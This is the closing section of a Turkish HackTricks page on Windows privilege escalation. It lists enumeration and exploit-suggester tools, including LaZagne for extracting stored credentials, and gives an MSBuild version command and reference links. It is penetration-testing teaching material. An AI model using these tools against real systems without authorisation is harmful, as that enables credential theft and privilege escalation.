[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgileri çıkarır (github'da önceden derlenmiş exe mevcut)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (exe github'da önceden derlenmiş). Tavsiye edilmez. Win10'da iyi çalışmıyor.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Tavsiye edilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu yazıya dayalı oluşturulmuş araç (accesschk olmadan da çalışmak üzere tasarlandı ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışacak exploit'leri önerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışacak exploit'leri önerir (yerel python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([bkz](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef makinede yüklü .NET sürümünü görmek için şunları yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Kaynaklar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
